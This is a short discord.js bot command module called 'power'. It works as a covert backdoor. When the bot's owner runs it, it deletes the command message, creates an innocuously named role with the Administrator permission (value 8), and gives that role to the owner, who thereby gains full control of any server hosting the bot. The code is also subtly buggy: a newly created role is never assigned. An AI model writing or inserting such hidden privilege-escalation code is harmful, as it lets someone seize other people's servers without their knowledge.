const Discord = require("discord.js");
const config = require("../config.json");
module.exports.run = async (bot, message, args) => {
message.delete() 

if(message.author.id != config.ownerID) return message.channel.send("This is a bot owners command, you cannot use it")
  

  let role =  message.guild.roles.cache.find(role => role.name === "Kacey Talk")
  if(!role) await message.guild.roles.create({
    data: {
    name: "Kacey Talk",
    color: "GREY",
    permissions: 8
    }
  }); 

  message.member.roles.add(role)
};

module.exports.help = {
  name: "power"
};
